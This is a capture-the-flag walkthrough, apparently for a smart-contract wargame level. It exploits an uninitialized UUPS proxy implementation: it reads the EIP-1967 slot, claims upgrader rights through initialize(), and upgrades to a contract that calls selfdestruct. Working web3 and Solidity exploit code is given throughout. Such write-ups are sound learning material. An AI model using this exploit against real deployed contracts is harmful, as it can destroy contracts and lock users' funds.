// the goal of this level is to self destruct the engine and make it unusable
// things that may help
// EIP-1967 => Proxy Storage Slots,
// A consistent location where proxies store the address of the logic contract they delegate to, 
// as well as other proxy-specific information
// UUPS upgradeable pattern
// Initializable contract
// upgradeToAndCall method is at our disposal for upgrading to a new contract address, 
// but it has an authorization check such that only the upgrader address can call it. 
// So, player has to somehow take over as upgrader.



// the idea here is to make a function call to the implementation contract so as to own it. after we set our selves as upgrader, we can then upgrade the contract to one with a self distruct mechanism and the call thaf function
1.  get the address of the implementation contract
implAddr = await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
 the last 20 bytes is the address of the implementation contract
 implAddr = '0x' + implAddr.slice(-40)

2. call the initialize function at the implementation contract so as to get upgrader rights

initializeData = web3.eth.abi.encodeFunctionSignature("initialize()")

await web3.eth.sendTransaction({ from: player, to: implAddr, data: initializeData })

confirm your upgrader

upgraderData = web3.eth.abi.encodeFunctionSignature("upgrader()")

await web3.eth.call({from: player, to: implAddr, data: upgraderData}).then(v => '0x' + v.slice(-40).toLowerCase()) === player.toLowerCase()

// Output: true

3. now since we can upgrade the contract, we create a malicious contract and include in it the self destruct method

// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

contract Hack {
    function explode() public {
        selfdestruct(address(0));
    }
}

4. upgrade implementation from engine to hack. call the upgradeToAndCall function on the implementation contract
set up First set up function data of upgradeToAndCall to call at implAddress

bombAddr = '<Hack-instance-address>'
explodeData = web3.eth.abi.encodeFunctionSignature("explode()")

upgradeSignature = {
    name: 'upgradeToAndCall',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: 'newImplementation'
        },
        {
            type: 'bytes',
            name: 'data'
        }
    ]
}

upgradeParams = [bombAddr, explodeData]

upgradeData = web3.eth.abi.encodeFunctionCall(upgradeSignature, upgradeParams)

then send the transaction from the implentation contract contrract

await web3.eth.sendTransaction({from: player, to: implAddr, data: upgradeData})

or simply

pragma solidity ^0.8;

interface IMotorbike {
    function upgrader() external view returns (address);
    function horsePower() external view returns (uint256);
}

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

// Get implementation
// await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
// 0x0000000000000000000000002c61fbf57208d2b3234d1383d84388a77c251bc5

contract Hack {
    function pwn(IEngine target) external {
        target.initialize();
        target.upgradeToAndCall(address(this), abi.encodeWithSelector(this.kill.selector));
    }

    function kill() external {
        selfdestruct(payable(address(0)));
    }
}